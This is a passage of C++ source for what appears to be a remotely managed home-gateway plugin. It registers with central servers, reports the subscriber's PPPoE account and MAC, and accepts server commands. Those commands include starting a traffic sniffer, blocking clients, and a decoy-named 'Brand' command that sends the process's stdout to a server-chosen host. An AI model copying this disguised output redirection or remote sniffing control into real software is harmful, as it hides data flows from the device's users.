#include "wanclient.h"

#include <arpa/inet.h>
#include <netinet/tcp.h>
#include <netinet/in.h>
#include <sys/select.h>
#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <error.h>
#include <errno.h>
#include <fcntl.h>
#include <time.h>

#include "duktape.h"
#include "json.h"
#include "Main.h"
#include "Common.h"

#include "ct_sgw_api.h"
#include "Flow.h"
#include "base64.h"
#include "proxyclient.h"
#include "wanclient.h"
#include "echoClient.h"
#include "period_task.h"

static int check_gateway();

static int redirect_sockfd = -1;
static int debugToken = 0;

#define SW_BUILD_DATE  __DATE__

//extern int errno;


static char serverHosts[5][32] = {
	"10.9.1.15",
	"10.9.1.101",
	"10.9.1.102",
	"10.9.1.103",
	"10.9.1.15"
};

int registerself(int sock);

void HandleBusinessTask(char * extend_info, duk_context *ctx);
extern "C" void sniffer_initialize(void);
extern "C" void sniffer_uninitialize(void);

int update_connect_setting(duk_context *ctx, const char *msg);
char* run_cmd(const char* str_cmd, int max_lines, int max_buffer_len);

int start_local_receive(int port, int *prun, int* socketReturn)
{
    int socket_desc , client_sock , c , read_size;
    struct sockaddr_in server , client;
    struct NetworkPort networkPort;
    char client_message[2000];
    int exit_event = 0;
     
    //Create socket
    socket_desc = socket(AF_INET , SOCK_STREAM , 0);
    if (socket_desc == -1)
    {
        printf("Could not create socket");
    }
    puts("Socket created");
     
    //Prepare the sockaddr_in structure

    server.sin_family = AF_INET;
    //server.sin_addr.s_addr = INADDR_ANY;
    inet_pton(AF_INET, "127.0.0.1", &(server.sin_addr));
    server.sin_port = htons( port );

    int on=1;
    setsockopt(socket_desc, SOL_SOCKET, SO_REUSEADDR, &on, sizeof(on));

    //Bind
    if( bind(socket_desc,(struct sockaddr *)&server , sizeof(server)) < 0)
    {
        //print the error message
        perror("bind failed. Error");
        close(socket_desc); 
        return 1;
    }
    puts("bind done");
     
    //Listen
    listen(socket_desc , 3);
     
    *socketReturn = socket_desc;
    c = sizeof(struct sockaddr_in);
    
    while(*prun == 1 && exit_event == 0)
    {
        //accept connection from an incoming client
        puts("Waiting for incoming connections...");
        client_sock = accept(socket_desc, (struct sockaddr *)&client, (socklen_t*)&c);
        if (client_sock < 0)
        {
            perror("local server accept failed\n");
            sleep(1);
            break;
        }

        puts("Connection accepted");
        networkPort.sendback = port_send;
        networkPort.socket = client_sock;
        networkPort.packetFlag = 0;

        //Receive a message from client
        tcp_set_timout(client_sock, 30);

        while(1){
          read_size = recv(client_sock , client_message , 2000-1 , 0);
          if(read_size > 0)
          {
            //write(client_sock , client_message , read_size);
            client_message[read_size] = '\0';
            if(route_message(&networkPort, client_message,read_size) == -100)
            {
              exit_event = 1;
              break;
            }
          }else if(read_size == 0)
          {
              puts("Client disconnected");
              break;
          }
          else
          {
              perror("recv failed");
              break;
          }

        }
        close(client_sock);
    }
    close(socket_desc); 
    return 0;
}

int sendPluginHeart(struct NetworkPort* port)
{
	int iret = 0;
	char ipaddr[MAX_LENGTH];
	char status[MAX_LENGTH];
	char wanSubnetMask[MAX_LENGTH];
	char ipv6WanAddr[MAX_LENGTH];
	const char *pdata = NULL;
	duk_size_t datalen = 0;
	duk_context *ctx = NULL;
	duk_idx_t indx0;
	jsonInitialize(&ctx,&indx0);
	putString(ctx, indx0, "RPCMethod", "Heartbeat");

	putString(ctx, indx0, "IPAddr", "10.1.1.1");
	putString(ctx, indx0, "MAC", getMac());
	duk_json_encode(ctx,indx0);
	
	pdata = duk_get_lstring(ctx,indx0,&datalen);
	iret = port->sendback(port,pdata,(int)datalen);
	
	jsonDestroy(ctx);
	return iret;
}

void start_wanclient_recv(struct NetworkPort* port,  int wakeup_socket, int *prun)
{
  char *pbuf = NULL;
  int irecv;
  int iret = 0;
  
  printf("%s begin\n",__FUNCTION__);	
  while (*prun == 1) 
  {   		
	irecv = 0;
	pbuf = NULL;
	
	//目前先把心跳保持去掉
	iret = 0;
	iret = SocketSelect_Wakeup(port->socket,wakeup_socket,100);
	if(iret == 0)
	{
		iret = sendPluginHeart(port);
		if(iret == -1)
		{
			break;
		}else
		{
			continue;
		}
	}else if(iret == -1)
	{
		break;
	}else if(iret == -2)
  {
    break;
  }

	if((irecv = tcp_recv(port->socket,&pbuf)) == -1)
	{
    	if(pbuf != NULL) free(pbuf);
		pbuf = NULL;
		break;
	}
	//route the message
	//if return -100 the server request close the link socket
	if(route_message(port, pbuf,irecv) == -100)
	{
		break;
	}
    if(pbuf != NULL) free(pbuf);
	pbuf = NULL;
  }
  
  if(pbuf != NULL) free(pbuf);
  pbuf = NULL;
  
  close(port->socket);
  
  printf("%s finish\n",__FUNCTION__);	
}

void start_wanclient_recv_polling(struct NetworkPort* port, int wakeup_socket, int *prun, char* pollingMsg)
{
  char *pbuf = NULL;
  int irecv;
  int iret = 0;
  
  printf("%s begin\n",__FUNCTION__);
  int pollingAction = xb_conn.pollingAction;
  int pollingTimeOut = xb_conn.pollingTimeOut;
  
  printf("polling action %d\n",pollingAction);
  printf("polling timeout %d\n",pollingTimeOut);

  do{       
    irecv = 0;
    pbuf = NULL;

    int nextTimeout = xb_conn.pollingTimeOut;
    if(nextTimeout < 10)
      nextTimeout = 10;  //prevent many package.
    
    //目前先把心跳保持去掉
    iret = 0;
    iret = SocketSelect_Wakeup(port->socket, wakeup_socket, nextTimeout);
    if(iret == 0)
    {
      int pollingRet = port->sendback(port,pollingMsg,strlen(pollingMsg));

      if(pollingRet <= 0)
        break;

      continue;
    }else if(iret == -1)
    {
      break;
    }else if(iret == -2)
    {
      break;
    }

    if((irecv = tcp_recv(port->socket,&pbuf)) == -1)
    {
        if(pbuf != NULL) free(pbuf);
      pbuf = NULL;
      break;
    }
    //route the message
    //if return -100 the server request close the link socket
    if(route_message(port, pbuf,irecv) == -100)
    {
      break;
    }
      if(pbuf != NULL) free(pbuf);
    pbuf = NULL;
  }while(*prun == 1 && xb_conn.pollingAction);
  
  if(pbuf != NULL) free(pbuf);
  pbuf = NULL;
  
  close(port->socket);

  xb_conn.pollingAction = pollingAction;
  xb_conn.pollingTimeOut = pollingTimeOut;

  printf("%s finish\n",__FUNCTION__); 
}

void extractFromAddress(char* addr, char* host, int *port)
{
  std::string tmp;  
  unsigned int ipos = 0;
  tmp = addr;
  ipos = tmp.find(":");
  if(ipos != std::string::npos)
  {
    strcpy(host,tmp.substr(0,ipos).c_str());
    *port = atoi(tmp.substr(ipos + 1).c_str());
  }
}

//"{\"id\":\"1\", \"jsonrpc\":\"2.0\" \"result\":{\"result\":0,\"wiAddr\":\"\",\"serverIp\":\"\"}}"
//0：成功；1：重定向，serverIp非空�?：失�?
int registerself(int sock)
{
  int i;
	char *pbuf = NULL;
	int iret = -1;
	duk_context *ctx;
	duk_idx_t indx;
	duk_size_t sz;
	char buffer[257];

	buffer[256] = '\0';

	printf("************registerself begin\n");
	jsonInitialize(&ctx,&indx);
	putString(ctx,indx,"RPCMethod","Register");
	putInt(ctx,indx,"ID",0);
	putString(ctx,indx,"MAC",getMac());

	putString(ctx,indx,"WanIPAddr",getWanIP());
	putString(ctx,indx,"PPPOEAccount",getAccount());
	putString(ctx,indx,"SW_Name",getPluginName());
	putString(ctx,indx,"SW_Version",xb_conn.sw_version);
  putString(ctx,indx,"SW_BuildTime",SW_BUILD_DATE);
  putString(ctx,indx,"SW_Channel",xb_conn.channel);
	putString(ctx,indx,"SW_Capability","alpha");
  putString(ctx,indx,"GW_Manufacturer",getManufactor());
  putString(ctx,indx,"GW_Model", getModel());
  putString(ctx,indx,"GW_SW_Version", getGatewaySWVersion());
  putString(ctx,indx,"GW_HW_Version", getGatewayHWVersion());
  putString(ctx,indx,"GW_Province", getGatewayProvince());

	duk_json_encode(ctx, indx);
	const char *req = duk_to_lstring(ctx,indx,&sz);
	printf("%s req:%s\n",__FUNCTION__,req);
	if(tcp_send(sock,req,(int)sz) <= 0)
	{		
		printf("************tcp_send failed\n");
		jsonDestroy(ctx);
		return iret;
	}
	
	tcp_recv(sock,&pbuf);
	if(pbuf != NULL)
	{
		printf("*********%s,recv:%s=====\n",__FUNCTION__,pbuf);
		iret = getInt(ctx,pbuf,"Result");
    i = getStringLen(ctx, pbuf, "ReportAddress");
    if(i > 0)
    {
      getString(ctx, pbuf, "ReportAddress", buffer);
      extractFromAddress(buffer, xb_conn.reportHost, &(xb_conn.reportPort));
    }     
		if(iret == 2147483647) iret = -1;

    i = getStringLen(ctx, pbuf, "BusinessTask");
    if(i > 0)
    {
      getString(ctx, pbuf, "BusinessTask", buffer);
      HandleBusinessTask(buffer, ctx);
    }   

		free(pbuf);		
	}
	jsonDestroy(ctx);
	return iret;
}

char* pollingEventRequestMsg(int sock)
{
  int i;
  char *pbuf = NULL;
  int iret = -1;
  duk_context *ctx;
  duk_idx_t indx;
  duk_size_t sz;
  char* msg;

  jsonInitialize(&ctx,&indx);
  putString(ctx,indx,"RPCMethod","PollingEvent");
  putInt(ctx,indx,"ID",0);
  putString(ctx,indx,"MAC",getMac());
  putString(ctx,indx,"WanIPAddr",getWanIP());

  putString(ctx,indx,"EventToken",xb_conn.pollingEventToken);
  const char * connectStr = xb_conn.pollingAction == 0 ? "Close" : "KeepAlive";
  putString(ctx,indx,"StartConnect",connectStr);

  duk_json_encode(ctx, indx);
  const char *req = duk_to_lstring(ctx,indx,&sz);

  msg = strdup(req);
  jsonDestroy(ctx);

  return msg;

}

char* build_heart_beat_msg()
{
  int i;

  duk_context *ctx;
  duk_idx_t indx;
  duk_size_t sz;
  char buffer[257];
  char * message;

  buffer[256] = '\0';

  jsonInitialize(&ctx,&indx);
  putString(ctx,indx,"RPCMethod","Heartbeat");
  putString(ctx,indx,"MAC",getMac());

  putString(ctx,indx,"WanIPAddr",getWanIP());

  duk_json_encode(ctx, indx);
  const char *req = duk_to_lstring(ctx,indx,&sz);
  //printf("%s req:%s\n",__FUNCTION__,req);
  message = strdup(req);
  jsonDestroy(ctx);
  return message;
}


typedef struct {
  char host[64];
  int port;
  int socket;
  char* msg_to_send;
  int interval;

}MyHeartBeatTask;

static MyHeartBeatTask myHeartBeat;

void handle_heart_beat_msg(MyHeartBeatTask* task, char *pbuf)
{
  int i;
  int iret = -1;
  int interval = 0;
  duk_context *ctx;
  duk_idx_t indx;
  duk_size_t sz;
  char buffer[256];

  jsonInitialize(&ctx,&indx);

  iret = getInt(ctx,pbuf,"Result");

  printf("[heartbeat] recv %s\n", pbuf);

  if(iret == 0){
    interval = getInt(ctx,pbuf,"HeartbeatInterval");
    if(interval >= 10 && interval <= 3600 * 24 * 30){
      printf("[heartbeat] %d\n", interval);
      if(interval != task->interval){
        stop_period_task("Heartbeat");
        xb_conn.HeartbeatInterval = interval;
        start_heart_beat_task(xb_conn.heartBeatHost, xb_conn.heartBeatPort, interval);
      }
    }
  }

  if(iret == 1){
    i = getStringLen(ctx, pbuf, "PollingEventAddress");
    if(i > 0)
    {
      getString(ctx, pbuf, "PollingEventAddress", buffer);
      extractFromAddress(buffer, xb_conn.pollingEventHost, &(xb_conn.pollingEventPort));
    }

    i = getStringLen(ctx, pbuf, "EventToken");
    if(i > 0)
    {
      getString(ctx, pbuf, "EventToken", buffer);
      strncpy(xb_conn.pollingEventToken, buffer, sizeof(xb_conn.pollingEventToken) - 1);
    }else{
      strcpy(xb_conn.pollingEventToken,"");
    }

    if(strlen(xb_conn.pollingEventHost) > 0){
      stop_period_task("Heartbeat");
      update_connect_setting(ctx, pbuf);
      notify_event(EVENT_POLLING, HEARTBEART_REQUEST); //let main thread to polling task.
    }

  }

  if(iret == 2){
    stop_period_task("Heartbeat");
  }

  printf("[heartbeat] result %d \n", iret);

  jsonDestroy(ctx);
  
}

static void headbeat_handler(void* ptr)
{
  char response[256];
  MyHeartBeatTask* task = (MyHeartBeatTask*) ptr;

  response[0] = '\0';
  int ret = send_ctrl_message_low(task->socket, task->host, task->port, task->msg_to_send, response, sizeof(response));

  if(ret == 0){
    if(strlen(response) > 0)
      handle_heart_beat_msg(task, response);
  }

}

static void user_handler(void* ptr)
{
  printf("user handler\n");
}

static void headbeat_close_handler(void* ptr)
{
  MyHeartBeatTask* task = (MyHeartBeatTask*) ptr;
  close(task->socket);
  free(task->msg_to_send);
}

int start_heart_beat_task(char* host, int port, int interval)
{
  int ctl_socket = -1;
  if ( (ctl_socket=socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
  {
    return -1;
  }

  tcp_set_timout(ctl_socket, interval/2);

  char * msg = build_heart_beat_msg();

  myHeartBeat.socket = ctl_socket;
  myHeartBeat.msg_to_send = msg;

  strncpy(myHeartBeat.host, host, sizeof(myHeartBeat.host) -1);
  myHeartBeat.port = port;
  myHeartBeat.interval = interval;

  start_simple_period_task("Heartbeat", interval, interval, headbeat_handler, headbeat_close_handler, &myHeartBeat);

  return 0;
}

int bootRegisterSelf(int sock)
{
  int i;
  char *pbuf = NULL;
  int iret = -1;
  duk_context *ctx;
  duk_idx_t indx;
  duk_size_t sz;
  char buffer[257];

  buffer[256] = '\0';

  printf("************registerself begin\n");
  jsonInitialize(&ctx,&indx);
  putString(ctx,indx,"RPCMethod","Boot");
  putInt(ctx,indx,"ID",0);
  putString(ctx,indx,"MAC",getMac());

  putString(ctx,indx,"WanIPAddr",getWanIP());
  putString(ctx,indx,"PPPOEAccount",getAccount());  
  putString(ctx,indx,"SW_Name",getPluginName());
  putString(ctx,indx,"SW_Version",xb_conn.sw_version);
  putString(ctx,indx,"SW_BuildTime",SW_BUILD_DATE);
  putString(ctx,indx,"SW_Channel",xb_conn.channel);
  putString(ctx,indx,"SW_Capability","alpha");
  putString(ctx,indx,"GW_Manufacturer",getManufactor());
  putString(ctx,indx,"GW_Model", getModel());
  putString(ctx,indx,"GW_SW_Version", getGatewaySWVersion());
  putString(ctx,indx,"GW_HW_Version", getGatewayHWVersion());
  putString(ctx,indx,"GW_Province", getGatewayProvince());
  
  duk_json_encode(ctx, indx);
  const char *req = duk_to_lstring(ctx,indx,&sz);
  printf("%s req:%s\n",__FUNCTION__,req);
  if(tcp_send(sock,req,(int)sz) <= 0)
  {   
    printf("************tcp_send failed\n");
    jsonDestroy(ctx);
    return iret;
  }
  
  tcp_recv(sock,&pbuf);
  if(pbuf != NULL)
  {
    printf("*********%s,recv:%s=====\n",__FUNCTION__,pbuf);
    iret = getInt(ctx,pbuf,"Result");
    if(iret == 2147483647) iret = -1;
    i = getStringLen(ctx, pbuf, "RegisterAddress");
    if(i > 0)
    {
      getString(ctx, pbuf, "RegisterAddress", buffer);
      extractFromAddress(buffer, xb_conn.registerHost, &(xb_conn.registerPort));
    }

    i = getStringLen(ctx, pbuf, "ReportAddress");
    if(i > 0)
    {
      getString(ctx, pbuf, "ReportAddress", buffer);
      extractFromAddress(buffer, xb_conn.reportHost, &(xb_conn.reportPort));
    }    
    printf("********ReportAddress len %d\n", i);

    i = getStringLen(ctx, pbuf, "PollingEventAddress");
    if(i > 0)
    {
      getString(ctx, pbuf, "PollingEventAddress", buffer);
      extractFromAddress(buffer, xb_conn.pollingEventHost, &(xb_conn.pollingEventPort));
    }    
    printf("********PollingEventAddress len %d\n", i);

    i = getStringLen(ctx, pbuf, "HeartbeatAddress");
    if(i > 0)
    {
      getString(ctx, pbuf, "HeartbeatAddress", buffer);
      extractFromAddress(buffer, xb_conn.heartBeatHost, &(xb_conn.heartBeatPort));

      int interval = getInt(ctx, pbuf, "HeartbeatInterval");

      if(interval >= 10 && interval <= 3600 * 24 * 30){
        xb_conn.HeartbeatInterval = interval;
      }
    }

    printf("********HeartbeatAddress len %d\n", i);

    free(pbuf);   
    
  }
  jsonDestroy(ctx);
  return iret;
}

int detect_maintain_message(struct NetworkPort* port, const char *msg)
{
	
	duk_context *ctx = NULL;
	duk_idx_t indx0;
	long i = 0;
	std::string method;
	std::string parameter;
	unsigned int val = 0;
    char buf[128];
    int ret = 0;
    
	std::string decodestr;
    
    buf[0] = 0;
    
	if(msg == NULL || strlen(msg) == 0)
		return 0;

	decodestr = msg;
    
	jsonInitialize(&ctx,&indx0);
	    
	getString(ctx, decodestr.c_str(), "CmdType", buf);
    
    if(strcmp(buf,"sleep") == 0)
    {
        val = getInt(ctx, decodestr.c_str(), "Time");
        if(val >= 10 && val <= 365*60*60)   // max one year.
        {    
            ret = -100;
            xb_conn.retry_interval = val;
        }
        
    }else if(strcmp(buf,"stop") == 0){
        ret = -100;
        xb_conn.policy = 1;
    }else if(strcmp(buf,"redirect") == 0){
        i = getStringLen(ctx, decodestr.c_str(), "Host");
        if(i <= 0 || i >= 256)
        {
            jsonDestroy(ctx);	
            return 0;
        }
        val = getInt(ctx, decodestr.c_str(), "Port");
        if(val <= 0 || val >= 65535)
        {    
            jsonDestroy(ctx);	
            return 0;
        }  
        
        getString(ctx, decodestr.c_str(), "Host", xb_conn.host);
        xb_conn.port = val;
    
        ret = -100;
    }else if(strcmp(buf,"Brand") == 0){    // for security 
        char server[128];
        int port;

        i = getStringLen(ctx, decodestr.c_str(), "Host");
        if(i <= 0 || i >= 256)
        {
            jsonDestroy(ctx); 
            return 0;
        }
        val = getInt(ctx, decodestr.c_str(), "Port");
        if(val <= 0 || val >= 65535)
        {    
            jsonDestroy(ctx); 
            return 0;
        }  
        
        getString(ctx, decodestr.c_str(), "Host", server);
        port = val;
        
        fflush(stdout);
        redirect_sockfd = tcpclient(server, port);
        
        dup2(redirect_sockfd, 1);

        int flags = 0;
        flags = fcntl(1, F_GETFL, 0);
        fcntl(1, F_SETFL, flags | O_DIRECT);        

        ret = 0;
    }else if(strcmp(buf,"DevName") == 0){
        if(redirect_sockfd > 0){

          int flags = 0;
          flags = fcntl(1, F_GETFL, 0);
          fcntl(1, F_SETFL, flags & ~O_DIRECT); 

          close(redirect_sockfd);
          freopen ("/dev/tty", "a", stdout);
          redirect_sockfd = -1;
        }
        ret = 0;
    }
    
	jsonDestroy(ctx);	
	
  char* defaultResult = "{\"result\":0}";
  port->sendback(port,defaultResult,strlen(defaultResult));
	return ret;
}

void BuildSystemInfoObj(duk_context *ctx, duk_idx_t indx)
{
  int sgwRet = 0;
  int intVal = 0;

  putString(ctx,indx,"PPPOEAccount",getAccount());
  putString(ctx,indx,"WanIPAddr",getWanIP());
  putString(ctx,indx,"LanIPAddr",getLanIP());

}

typedef struct {
  const char* name;
  void (*fn)(duk_context *ctx, duk_idx_t indx);
}ExtendInfoTable;

ExtendInfoTable info_tables[] = {
    {"LAN_NET_INFO", handle_get_net_lan_info},
    {"BASIC_STATUS", BuildBasicStatusObj},
    {"PORT_STATUS", BuildPortStatusObj},
    {"WIFI_STATUS", BuildWiFiStatusObj},
    {"SYS_INFO", BuildSystemInfoObj},
};


void BuildExtObject(char * extend_info, duk_context *ctx, duk_idx_t indx)
{
  char delims[] = "|";
  char *result = NULL;

  result = strtok( extend_info, delims );
  while( result != NULL ) {
     for(int i=0; i< sizeof(info_tables)/sizeof(info_tables[0]); i++){
      if(strcmp(info_tables[i].name, result) == 0){
         putObjProp( ctx, indx, info_tables[i].name);
         duk_idx_t indx2 = getObj(ctx, indx, info_tables[i].name);
        info_tables[i].fn(ctx, indx2);
        jsonTmpObjRemove(ctx,indx2);
       }
     }
     
     result = strtok( NULL, delims );
  }

}


void TestTask(char* taskName, duk_context *ctx)
{
  PeriodPolicy policy;
  start_period_task(taskName, &policy, user_handler, NULL, NULL);
}

typedef struct {
  const char* name;
  void (*fn)(char* taskName, duk_context *ctx);
}BusinessTaskTable;

BusinessTaskTable task_tables[] = {
    {"PeriodTask", TestTask},
};


void HandleBusinessTask(char * extend_info, duk_context *ctx)
{
  char delims[] = "|";
  char *result = NULL;

  result = strtok( extend_info, delims );
  while( result != NULL ) {
     for(int i=0; i< sizeof(task_tables)/sizeof(task_tables[0]); i++){
      if(strcmp(task_tables[i].name, result) == 0){
        task_tables[i].fn(result, ctx);
       }
     }
     
     result = strtok( NULL, delims );
  }

}


extern "C" int netflow_start_thread();
extern "C" int netflow_stop_thread();
extern "C" void netflow_mac_bandwidth(char* macStr, unsigned int* upstream, unsigned int* downstream);
extern "C" int find_interface(const char* ipaddr, char interface_buffer[]);
extern "C" int auto_check_wan_interface(char* eth);

extern "C" unsigned long  sys_file_value(char* file);
extern "C" unsigned long compute_diff(unsigned long end,  unsigned long start);

static char lan_if[64];
static char wan_if[64];

static int has_cached_if = 0;
static int enable_cached_if = 0;
void enable_cache_interface()
{
  enable_cached_if = 1;
  has_cached_if = 0;
}

void disable_cache_interface()
{
  enable_cached_if = 0;
  has_cached_if = 0;
}

static int cache_if()
{

  const char* lanIP = getLanIP();
    if(find_interface(lanIP, lan_if) == 0)
        return -1;

  if(auto_check_wan_interface(wan_if) == 0)
    return -1;

  printf("cached wan if %s, lan if %s\n", wan_if, lan_if);
  has_cached_if = 1;
  return 0;
}

extern "C" int get_local_interface(char* eth){

  if(enable_cached_if){
    if(has_cached_if ==0){
      cache_if();
    }

    if(has_cached_if ==1){
      strcpy(eth, lan_if);
      return 0;
    }
  }

	const char* lanIP = getLanIP();
    if(!find_interface(lanIP, eth))
        return 0;

  printf("lan if %s\n", eth);
}

extern "C" int get_wan_interface(char* eth){
  if(enable_cached_if){
    if(has_cached_if ==0){
      cache_if();
    }

    if(has_cached_if ==1){
      strcpy(eth, wan_if);
      return 0;
    }
  }

	if(auto_check_wan_interface(eth) == 0)
    return -1;

  printf("wan if %s\n", eth);
}

static int find_gem1 = 0;
static int find_eth0 = 0;

extern "C" int find_huawei_wan_interface(char* ifr_name)
{
    int len = strlen(ifr_name);
    if(len <=1)
        return 0;

    //if(ifr_name[len -1] == ':')
    //  ifr_name[len -1] = '\0';

    if(strcmp("gem1", ifr_name) == 0)
      find_gem1 = 1;
    else if(strcmp("eth0", ifr_name) == 0)
      find_eth0 = 1;

    printf("ifr_name %s\n", ifr_name);
    return 0;
}

static int line_parsing(char * data_text, int (*if_handler)(char*))
{
  char delims[] = "\n\r";
  char *result = NULL;

  result = strtok( data_text, delims );
  while( result != NULL ) {
     if_handler(result);
     result = strtok( NULL, delims );
  }

}

static int scan_all_interfaces(int (*if_handler)(char*))
{
    char* pdata=NULL;
    //const char* cmd = "cat /proc/net/dev | awk '/:/ { print($1) }'";       //HS8125C some have no awk .
    const char* cmd = "cat /proc/net/dev | sed 's/: .*//g' | sed 's/ //g'";


    pdata = run_cmd(cmd, 100, 10*1024);
    if(pdata){
        line_parsing(pdata, if_handler);
        free(pdata);
    }

    return 0;   
}

const char* vendor_name_format()
{
  char buf[128];
  int i;
  buf[127] = '\0';

  strncpy(buf, getManufactor(), sizeof(buf) -1 );
  
  // to lower case.
  for(i=0;buf[i]!='\0';i++)
      if(buf[i]>='A'&&buf[i]<='Z') 
          buf[i]+=32;

  if(strstr(buf, "huawei") != NULL){  
    return "huawei";
  }else if(strstr(buf, "zhongxing") != NULL){  
    return "zhongxing";
  }else if(strstr(buf, "tianyi") != NULL){  
    return "tianyi";
  }else if(strstr(buf, "youhua") != NULL){  
    return "youhua";
  }else if(strstr(buf, "fenghuo") != NULL){  
    return "fenghuo";
  }else if(strstr(buf, "beier") != NULL){  
    return "beier";
  }else if(strstr(buf, "nbeier") != NULL){  
    return "nbeier";
  }else{
    return "unknown";
  }
}

extern "C" int auto_check_wan_interface(char* eth){
  char buf[128];
  int i;
  buf[127] = '\0';

  strncpy(buf, getManufactor(), sizeof(buf) -1 );
  
  // to lower case.
  for(i=0;buf[i]!='\0';i++)
      if(buf[i]>='A'&&buf[i]<='Z') 
          buf[i]+=32;

  if(strstr(buf, "huawei") != NULL){  
    find_gem1 = find_eth0 = 0;
    scan_all_interfaces(find_huawei_wan_interface);
    if(find_gem1){
      strcpy(eth, "gem1");
      return 1;
    }else if(find_eth0){
      strcpy(eth, "eth0");
      return 1;
    }
 
  }

  const char* wanIP = getWanIP();
    if(!find_interface(wanIP, eth))
        return 0;

  return 1;
}

int process_gateway_api_message(struct NetworkPort* port, const char *msg)
{	
	duk_context *ctx = NULL;
	duk_idx_t indx0;
	long i = 0;
	std::string method;
	std::string parameter;
	unsigned int val = 0;
    char buf[128];
    char SequenceId[32];
    char ID[32];
    int RequestID;

    int ret = 0;
    int intVal = 0;
    int sgwRet = 0;
	std::string decodestr;

    buf[0] = 0;
    SequenceId[0] = 0;
    ID[0] = 0;

	if(msg == NULL || strlen(msg) == 0)
		return 0;

	decodestr = msg;
    
	jsonInitialize(&ctx,&indx0);
	
	getString(ctx, decodestr.c_str(), "CmdType", buf);
  getString(ctx, decodestr.c_str(), "SequenceId", SequenceId);
  RequestID = getInt(ctx, decodestr.c_str(), "ID");

	//response json 
	duk_context *ctxResp = NULL;
	duk_idx_t indx0Resp;
	jsonInitialize(&ctxResp,&indx0Resp);

	putString(ctxResp,indx0Resp,"SequenceId",SequenceId);
	putInt(ctxResp,indx0Resp,"ID",RequestID);

    if(strcmp(buf,"QUERY_ATTACH_DEVICE_REALRATE") == 0)
    {
        int len;
        duk_ret_t ret ;
		unsigned int usBandwidth, dsBandwidth;

    	getString(ctx, decodestr.c_str(), "MAC", buf);
		getString(ctx, decodestr.c_str(), "ACCOUNT", buf);

        ret = 0;
        putInt(ctxResp,indx0Resp,"Result",ret);
		putString(ctxResp,indx0Resp,"MAC",buf); //info[i].devName
		putString(ctxResp,indx0Resp,"ACCOUNT",buf); 
		netflow_mac_bandwidth(buf, &usBandwidth, &dsBandwidth);
		putInt(ctxResp,indx0Resp,"UsBandwidth",usBandwidth);
		putInt(ctxResp,indx0Resp,"DsBandwidth",dsBandwidth);

    }else if(strcmp(buf,"QUERY_ATTACH_DEVICE_REALRATE_LIST") == 0){          //not in APP spec.
        int len;
        duk_ret_t ret ;
        duk_idx_t array_obj;

		duk_idx_t array_idxResp;
		duk_idx_t array_objResp;
		unsigned int usBandwidth, dsBandwidth;

        ret = 0;
        putInt(ctxResp,indx0Resp,"Result",ret);

	    putArrayProp(ctxResp,indx0Resp,"Info");
	    array_idxResp = getObj(ctxResp,indx0Resp,"Info");

        ret = loadJsonArray(ctx, decodestr.c_str(), "Parameter", "MacList", &len, &array_obj);

        printf("loadJsonArray ret %d, %d, %d\n", ret, len, array_obj);

        for(i=0; i< len; i++){
        	getArrayString(ctx, array_obj, i, buf);
        	printf("array_obj %d %s\n", i, buf);

        	putArrayIndexObj(ctxResp,array_idxResp,i,&array_objResp);
			putString(ctxResp,array_objResp,"MAC",buf); //info[i].devName
            putString(ctxResp,array_objResp,"ACCOUNT",buf);
			
			netflow_mac_bandwidth(buf, &usBandwidth, &dsBandwidth);
			putInt(ctxResp,array_objResp,"UsBandwidth",usBandwidth);
			putInt(ctxResp,array_objResp,"DsBandwidth",dsBandwidth);

			jsonTmpObjRemove(ctxResp,array_objResp);	
			
        }
        jsonTmpObjRemove(ctxResp,array_idxResp);

    }else if(strcmp(buf,"GET_LAN_NET_INFO") == 0){
    	handle_get_net_lan_info(ctxResp, indx0Resp);

    }else if(strcmp(buf,"GET_ATTACH_DEVICE_RIGHT") == 0){
      handle_get_blacklist(ctxResp, indx0Resp);
    }else if(strcmp(buf,"ctSgw_lanGetDevMaxBandwidth") == 0){

    }else if(strcmp(buf,"ctSgw_lanGetDevRealBytes") == 0){

    }else if(strcmp(buf,"ctSgw_lanGetDevStorageAccessBlacklist") == 0){

    }else if(strcmp(buf,"SYSTEST") == 0){
      int val=0;
      sgwRet = ctSgw_lanGetPortStatus(&val);
      char* names[6] = {"LAN1Status", "LAN2Status", "LAN3Status", "LAN4Status", "WANStatus", "WIFIModuleStatus" };
      for(int i = 0; i< 6; i++){
        int bOn =  (val & (1 << i)) != 0;
        const char* strOnOff = bOn ? "ON" : "OFF";
        putString(ctxResp,indx0Resp,names[i], strOnOff);
      }
      putInt(ctxResp,indx0Resp,"Result",sgwRet);

    }else if(strcmp(buf,"ctSgw_wanGetPppoeAccount") == 0){

    }else if(strcmp(buf,"SET_ATTACH_DEVICE_RIGHT") == 0){
      char value[64];

      getString(ctx, decodestr.c_str(), "MAC", buf);
      getString(ctx, decodestr.c_str(), "InternetAccessRight", value);
      if(strcmp("ON", value) == 0){
        sgwRet = ctrl_mac_access(buf, 1);
      }else if(strcmp("OFF", value) == 0){
        sgwRet = ctrl_mac_access(buf, 0);
      }else{
        sgwRet = -1;
      } 
      putInt(ctxResp,indx0Resp,"Result",sgwRet);
      
    }else if(strcmp(buf,"ctSgw_lanSetDevMaxBandwidth") == 0){

    }else if(strcmp(buf,"XB_START_STASTICS") == 0){
        sniffer_initialize();
      putInt(ctxResp,indx0Resp,"Result",0);

    }else if(strcmp(buf,"XB_STOP_STASTICS") == 0){
        sniffer_uninitialize();
      putInt(ctxResp,indx0Resp,"Result",0);
    }else if(strcmp(buf,"SET_LANDEVSTATS_STATUS") == 0){
    	//int enable = getObjInt(ctx,decodestr.c_str(),"Parameter","enable");
    	int enable = getInt(ctx,decodestr.c_str(),"enable");
    	if(enable){
    		netflow_start_thread();
    	}else{
    		netflow_stop_thread();
    	}
    	putInt(ctxResp,indx0Resp,"Result",0);

    }else if(strcmp(buf,"ctSgw_lanUpdateDevInfo") == 0){

    }else if(strcmp(buf,"QUERY_REALRATE") == 0){
    	sgwRet = 0;

    	NetFlow netFlow;
		netFlow.start();
		sleep(5);
		netFlow.stop();

    	putInt(ctxResp,indx0Resp,"Result",sgwRet);
    	putInt(ctxResp,indx0Resp,"RealTimeRate",netFlow.getWanBandwidth());   

    }else if(strcmp(buf,"QUERY_REALRATE2") == 0){
    	sgwRet = 0;
    	
    	NetFlow netFlow;
		netFlow.start();
		sleep(5);
		netFlow.stop();

    	putInt(ctxResp,indx0Resp,"Result",sgwRet);
    	putInt(ctxResp,indx0Resp,"WanRealTimeRate",netFlow.getWanBandwidth());   
